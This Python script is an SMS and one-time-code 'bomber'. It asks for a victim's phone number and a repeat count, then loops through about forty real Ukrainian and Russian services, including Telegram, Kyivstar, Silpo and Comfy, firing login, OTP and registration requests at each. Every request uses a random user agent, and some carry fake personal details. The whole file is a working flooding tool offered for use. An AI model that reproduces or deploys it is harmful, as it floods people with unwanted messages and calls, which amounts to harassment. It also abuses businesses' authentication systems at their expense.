from colorama import Style, Fore, Back
import requests as R
from rich.progress import *
def generate_info(number_phone):
    global head
    global password 
    global name
    global addres
    global gmail
    global login
    global plus_phone
    global nice
    global fail
    global zag
    global skobka_nomer1
    global skobka_nomer2
    global skobka_nomer3
    global skobka_nomer4
    global skobka_nomer5
    from faker import Faker
    import random, fake_useragent
    head = {"user-agent": fake_useragent.UserAgent().random}
    faker = Faker('uk_UA')
    name = faker.name()
    addres = faker.address()
    gmail = faker.email()
    password = ""
    login = ""
    for _ in range(9):
        password = password + random.choice(list('QWERTZUIOPASDFGHJKLYXCVBNM1234567890qwertzuiopasdfghjklyxcvbnm'))
        
    for _ in range(7):
        login = login + random.choice(list('QWERTZUIOPASDFGHJKLYXCVBNM1234567890qwertzuiopasdfghjklyxcvbnm'))
    for _ in range(8):
        password = password + random.choice(list("qwertzuiopasdfghjklyxcvbnm1234567890QWERTZUIOPASDFGHJKLYXCVBNM"))
    phone = list(number_phone)
    cif1 = phone[0]
    cif2 = phone[1]
    cif3 = phone[2]
    cif4 = phone[3]
    cif5 = phone[4]
    cif6 = phone[5]
    cif7 = phone[6]
    cif8 = phone[7]
    cif9 = phone[8]
    cif10 = phone[9]
    cif11 = phone[10]
    cif12 = phone[11]

    skobka_nomer1 = "+" + cif1 + cif2 + "(" + cif3 + cif4 + cif5 + ")" + cif6 + cif7 + cif8 + "-" + cif9 + cif10 + cif11 + cif12
    skobka_nomer2 = "+" + cif1 + cif2 + "(" + cif3 + cif4 + cif5 + ")" + cif6 + cif7 + cif8 + "-" + cif9 + cif10 + "-" + cif11 + cif12
    skobka_nomer3 = "+" + cif1 + cif2 + "(" + cif3 + cif4 + cif5 + ")" + " " + cif6 + cif7 + cif8 + "-" + cif9 + cif10 + "-" + cif11 + cif12
    skobka_nomer4 = "+" + cif1 + cif2 + " (" + cif3 + cif4 + cif5 + ") " + cif6 + cif7 + cif8 + "-" + cif9 + cif10 + cif11 + cif12
    skobka_nomer5 = "+" + cif1 + cif2 + cif3 + "(" + cif4 + cif5 + ")" + cif6 + cif7 + cif8 + "-" + cif9 + cif10 + "-" + cif11 + cif12
    nice = Fore.YELLOW + Style.BRIGHT + "[+] " + Fore.GREEN + Style.BRIGHT
    fail = Fore.YELLOW + Style.BRIGHT + "[-] " + Fore.RED + Style.BRIGHT
    zag = Fore.CYAN + Style.BRIGHT + "[~]" + Fore.YELLOW + Style.BRIGHT
def telegram_org():
    try:
        R.post('https://my.telegram.org/auth/send_password', data={"phone": '+' + number}, headers=head,)
        print (nice + "Telegram отправлено")
    except:
        print (fail + 'Telegram не отправлено')
def citrus():
    try:
        R.post("https://my.ctrs.com.ua/api/auth/login", data={"provider": "phone", 'identity': number}, headers=head)
        print (nice + 'Citrus отправлено')
    except:
        print (fail + 'Citrus не отпраалено')
def helsi():
    try:
        R.post("https://helsi.me/api/healthy/accounts/login", json={"phone": number, "platform": "PISWeb"}, headers=head)
        print (nice + 'Helsi отправлено')
    except:
        print (fail + 'Helsi не отправлено')
def podorozshik():
    try:
        R.post('https://ucb.l.podorozhnyk.com/api/send/otp', json={"phone": number}, headers=head)
        print (nice + 'Подорожник отправлено')
    except:
        print (fail + 'Подорожник не отправлено')
def multiplex():
    try:
        R.post('https://auth2.multiplex.ua/login', json={"login": number}, headers=head)
        print (nice + 'Multiplex отправлено')
    except:
        print (fail + 'Multiplex не отправлено')
def likari_24():
    try:
        R.post('https://api.likari.in.ua/v2/auth/sms', json={"phone": number.replace("38", "")}, headers=head)
        print (nice + 'Likari 24-7 отправлено')
    except:
        print (fail + 'Likari 24-7 не отправлено')
def parasol():
    try:
        R.post('https://api.parasol.ua/api/login/sms', json={"phone": "+" + number})
        print (nice + 'Parasol отправлено')
    except:
        print (fail + 'Parasol не отправлено')
def starlev():
    try:
        R.post('https://api.starylev.com.ua/api/v1.1/sms/sent', json={"email": gmail,"type": 'registration', "phone": number}, headers=head)
        print (nice + 'StarLev отправлено')
    except:
        print (fail + 'StarLev отправлено')
def silpo():
    try:
        R.post('https://auth.silpo.ua/api/v1/Login/ByPhone?returnUrl=https%3A%2F%2Fauth.silpo.ua%2Fconnect%2Fauthorize%2Fcallback%3Fclient_id%3Dsilpo-site-shop-spa%26redirect_uri%3Dhttps%253A%252F%252Fshop.silpo.ua%252Fsignin-callback-angular.html%26response_type%3Dcode%26scope%3Dpublic-my%2520openid%2520offline_access%26nonce%3D2e35801532e9723d1ad212b2f086b57fa6NXkOzlu%26state%3D656e3b7b476022b0a7c71359d2425a91cd2dZOlu1%26code_challenge%3DBJGJYX7qw-XZrtQWo-HcooqNkuJ7hOgy3btao2xx2Qs%26code_challenge_method%3DS256', json={"delivery_method": "sms", "phone": "+" + number, "phoneChannel Type": "0", "recaptcha": "null"}, headers=head)
        print (nice + 'Silpo отправлено')
    except:
        print (fail + 'Silpo не отправлено')
def kyivstar():
    try:
        R.post('https://account.kyivstar.ua/cas/new/api/otp/send?locale=uk', json={"action": "auth", "login": number}, headers=head)
        print (nice + 'Kyivstar отправлено')
    except:
        print (fail + 'Kyivstar не отпраалено')
def ultrashop():
    try:
        R.post('https://ultra-shop.com/ua/user-verification/default/send-code', json={"phone": '+' + number}, headers=head)
        print (nice + 'UltraShop отправлено')
    except:
        print (fail + 'UltraShop не отправлено')
def varus():
    try:
        R.post('https://varus.ua/api/ext/uas/auth/send-otp?storeCode=ua', json={"phone": '+' + number}, headers=head)
        print (nice + 'Varus отправлено')
    except:
        print (fail + 'Varus не отправлено')
def b4s():
    try:
        R.post('https://oauth.telegram.org/auth/request?bot_id=883734075&origin=https%3A%2F%2Fconsole.bot4shop.com&embed=1&request_access=write&return_to=https%3A%2F%2Fconsole.bot4shop.com%2Flogin.html', data={"phone": "+" + number}, headers=head)
        print (nice + 'b4s (Telegram) отправлено')
    except:
        print (fail + 'b4s не отправлено')
def rutgstore():
    try:
        R.post('https://oauth.telegram.org/auth/request?bot_id=1803424014 &origin=https%3A%2F%2Fru.telegram-store.com&embed=1&request_access=write&return_to=https%3A%2F%2Fru.telegram-store.com%2F', data={"phone": "+" + number}, headers=head)
        print (nice + 'ru.telegram-store (telegram) отправлено')
    except:
        print (fail + 'ru.telegram-store не отправлено')
def presscode_app():
    try:
        R.post('https://oauth.telegram.org/auth/request?bot_id=1852523856 &origin=https%3A%2F%2Fcabinet.presscode.app&embed=1&r eturn_to=https%3A%2F%2Fcabinet.presscode.app%2Flogin', data={"phone": "+" + number}, headers=head)
        print (nice + 'presscode (telegram) отправлено')
    except:
        print (fail + 'presscode не отправлено')
def tbiz():
    try:
        R.post('https://oauth.telegram.org/auth/request?bot_id=1733143901&origin=https%3A%2F%2Ftbiz.pro&embed=1&request_access=write&return_to=https%3A%2F%2Ftbiz.pro%2Flogin', data={"phone": "+" + number}, headers=head)
        print (nice + 'tbiz (telegram) отправлено')
    except:
        print (fail + 'tbiz (telegram) не отправлено')
def telegrambot():
    try:
        R.post('https://oauth.telegram.org/auth/request?bot_id=319709511&origin=https%3A%2F%2Ftelegrambot.biz&embed=1&request_access=write&return_to=https%3A%2F%2Ftelegrambot.biz%2F', data={"phone": "+" + number}, headers=head)
        print (nice + 'telegrambot (telegram) отправлено')
    except:
        print (fail + 'telegrambot не отправлено')
def combot():
    try:
        R.post('https://oauth.telegram.org/auth/request?bot_id=210944655&origin=https%3A%2F%2Fcombot.org&embed=1&request_access=write&return_to=https%3A%2F%2Fcombot.org%2Flogin', data={"phone": "+" + number}, headers=head)
        print (nice + 'combot (telegram) отправлено')
    except:
        print (fail + 'combot не отправлено')
def bott():
    try:
        R.post('https://oauth.telegram.org/auth/request?bot_id=1199558236&origin=https%3A%2F%2Fbot-t.com&embed=1&request_access=write&return_to=https%3A%2F%2Fbot-t.com%2Flogin', data={"phone": "+" + number}, headers=head)
        print (nice + 'bot-t (telegram) отправлено')
    except:
        print (fail + 'bot-t не отправлено')
def tefalshop():
    try:
        R.post("https://shop.tefal.ua/graphql", json={"email": "jehdhdhd@gmail.com", "firstname": "Олег", "lastname": "Поносов", "phone": "+" + number, "token": "null"}, headers=head)
        print (nice + 'TefalShop отправлено')
    except:
        print (fail + 'TefalShop не отправлено ')
def megasport():
    try:
        R.post('https://megasport.ua/api/auth/phone/?auth=web_client_2&language=ua', json={"phone": "+" + number}, headers=head)
        print (nice + 'MegaSport отправлено')
    except:
        print (fail + 'MegaSport не отправлено')
def skyeng():
    try:
        R.post('https://id.skyeng.ru/user-api/v1/auth/one-time-password/by-phone-to-login-or-confirm',cookies={'_seid': 'c102060a28494d129d2ba59b85ccba00', '_setz': 'Asia/Tashkent', '_seqp': 'utm_source=advcake&utm_medium=cpa&utm_campaign=n_|mas_4345726|ptn_epn|ma_Berezhnoy|own_b2c|chg_affiliate&utm_advcake_params=46rs0rtgrkcigv7fet1wp55v5idoph75&utm_term=46rs0rtgrkcigv7fet1wp55v5idoph75', '_seqp_time': '1679652057', 'session_global': 'oo118dmrb2oqkkd7q4auv6b6rs',}, data={'csrf': 'a271e81bcc534ed4c.0JLnXysFgmdrPsSuzwHH02W09tCjeXC9hkHO2BlVp6k.mdDQCUhp6FcYbIn09zilug7YjobJEBzNsHeaiXck8dyG3IYIHW_WE0ZQiQ', 'confirm': '1', '_origin_referer': 'https://my.sky.pro/', 'skin': 'skypro', 'phone': '+' + number})
        print (nice + 'SkyEng отправлено')
    except:
        print (fail + 'SkyEng не отправлено')
def botobot():
    try:
        R.post("https://oauth.telegram.org/auth/request?bot_id=366357143&origin=https%3A%2F%2Fwww.botobot.ru&embed=1&request_access=write&lang=ru&return_to=https%3A%2F%2Fwww.botobot.ru%2F", data={"phone": "+" + number}, headers=head)
        print (nice + 'BotoBot (Telegram) отправлено')
    except:
        print (fail + 'BotoBot не отправлено')
def uklon():
    try:
        R.put("https://partnerregistration.uklon.com.ua/api/v1/landing/verification", data={"locale": "UK", "phone": "+" + number}, headers=head)
        print (nice + 'Uklon отправлено')
    except:
        print (fail + 'Uklon не отправлено')
def dianet():
    try:
        R.options("https://my.dianet.online/api/v1/send_message", data={"phone": number}, headers=head)
        print (nice + 'Dianet отправлено')
    except:
        print (fail + 'Dianet не отправлено')
def comfy():
    try:
        R.post("https://comfy.ua/api/auth/v3/otp/send", json={"phone": number}, headers=head)
        print (nice + 'Comfy отправлено')
    except:
        print (fail + "Comfy не отправлено")
def anc():
    try:
        R.post("https://anc.ua/authorization/auth/v2/register", json={"login": "+" + number, "s": "e43ba8684bf887cb61c486592c477da8"}, headers=head)
        print (nice + 'ANC отправлено')
    except:
        print (fail + 'ANC не отправлено')
def staff():
    try:
        R.options("https://api.staff-clothes.com/api/v1/send-sms-code?access_token=MDFiNjdiNGFhZjU4ZDU0YzVkMjQ4NDMxYTISYWM0Y2QzZjQzNjJhYjI4ZjY1ODJlOTZjN2QxMmQxNjM20TMyNQ&locale=ua&action=register_new_user", data={"mobileNumber": number}, headers=head)
        print (nice + 'Staff отправлено')
    except:
        print (fail + 'Staff не отправлено')
def avtoprod():
    try:
        R.post("https://avtoprod.ua/graphql", json={"query": '{jwtPhone(number: "' + "+" + number + '") {\n          token\n          non_field_errors\n          code\n          }}'}, headers=head)
        print (nice + 'AvtoProd отправлено')
    except:
        print (fail + 'AvtoProd не отправлено')
def klrbus():
    try:
        R.post("https://api.klr.com.ua/api/customers/sms-auth/send-code", json={"phone": "+" + number}, headers=head)
        print (nice + 'KLRbus отправлено')
    except:
        print (fail + 'KLRbus не отправлено')
def colorit():
    try:
        R.post("https://apidev.color-it.ua/api/auth/code", json={"phone": number.replace("38", "")}, headers=head)
        print (nice + 'ColorIT отправлено')
    except:
        print (fail + 'ColorIT не отправлено')
def whp():
    try:
        R.post("https://ca-rg-mhp-hr-mhp4u-prod-back.bluesea-04e276df.westeurope.azurecontainerapps.io/feedback/phone", data={"phone": "+" + number}, headers=head)
        print (nice + "WHP4U отправлено")
    except:
        print (fail + "WHP4U не отправлено")
def stylus():
    try:
        R.post("https://gateway.prod.stylusapp.click/auth/register", json={"email": gmail, "first_name": "Олег", "last_name": "Бобров", "phone": "+" + number}, headers=head)
        print (nice + "Stylus отправлено")
    except:
        print (fail + "Stylus не отпpавлено")
def prostor():
    try:
        R.post("https://prostor.ua/ua/rest/V1/customer/send-otp/", json={"phoneNumber": number}, headers=head)
        print (nice + "Prostor отправлено")
    except:
        print (fail + "Prostor не отправлено")
def navse():
    try:
        R.post("https://api.creditkasa.ua/public/auth/sendAcceptanceCode",json={"brandName": "NaVse", "mobilePhone": number, "productGroup": "INSTALLMENT"}, headers=head)
        print (nice + "NaVse отправлено")
    except:
        print (fail + "NaVse не отправлено")
def apteki():
    try:
        R.post("https://suitecrm.morion.ua/service/v4_1/rest.php",json={"method": "sms", "input_type": "JSON", "response_type": "JSON", "rest_data": {"phone": number, "app_id":"apteki", "sms":"registration"}}, headers=head)
        print (nice + "Apteki отправлено")
    except:
        print (fail + "Apteki не отправлено")
def iqpizza():
    try:
        R.post("https://iq-pizza.eatery.club/site/v1/pre-login",json={"phone": number}, headers=head)
        print (nice + "IQpizaa отправлено")
    except:
        print (fail + "IQpizza не отправлено")
def medics():
    try:
        R.post("https://medics.ua/api/v1/verifications",json={"action_type": "registration", "phone": number}, headers=head)
        print (nice + "Medics отправлено")
    except:
        print (fail + "Medics не отправлено")
def smvape():
    try:
        R.post("https://smvape.com.ua/module/ecm_smssender/otp", data={"ajax": "true", "action": "sendOtp", "phone": skobka_nomer2, "mode": "verify", "onestep": "true"}, headers=head)
        print (nice + "SMVapeShop отправлено")
    except:
        print (fail + "SMVapeShop не отправлено")
def retromagaz():
    try:
        R.post("https://retromagaz.com/login/phone", json={"phone": skobka_nomer4}, headers=head) # если есть аккаунт(сброс пароля)
        R.options("https://retromagaz.com/register", json={"name": "Олег", "surname": "Бобров поносов", "phone": skobka_nomer4, "email": "eokehdjdj@gmail.com", "password": "1234509876artfF&"}, headers=head)
        print (nice + "RetroMagaz отправлено")
    except:
        print (fail + "RetroMagaz не отправлено")
def souspizza():
    try:
        R.post("https://souspizza.com/api/customer/auth",json={"count": "0", "phone": skobka_nomer5, "utm": "{}"}, headers=head)
        print (nice + "SousPizza отправлено")
    except:
        print (fail + "SousPizza не отправлено")
def ATTACK(target):
      try:
                generate_info(target)
                citrus()
                telegram_org()
                helsi()
                podorozshik()
                multiplex()
                likari_24()
                starlev()
                silpo()
                kyivstar()
                ultrashop()
                varus()
                parasol()
                b4s()
                rutgstore()
                presscode_app()
                tbiz()
                telegrambot()
                combot()
                bott()
                botobot()
                tefalshop()
                megasport()
                skyeng()
                uklon()
                dianet()
                comfy()
                anc()
                avtoprod()
                klrbus()
                colorit()
                whp()
                stylus()
                prostor()
                navse()
                apteki()
                iqpizza()
                medics()
                smvape()
                retromagaz()
                souspizza()
      except KeyboardInterrupt:
                print('\nОтмена.')
      finally:
          print (Fore.CYAN + Style.BRIGHT + "Круг пройден!")
number = str(input(Fore.YELLOW + Style.BRIGHT + "Введи номер телефона +"))
run = int(input(Fore.CYAN + Style.BRIGHT + "Количество повторений: "))
for _ in track(range(run)):
    ATTACK(number)
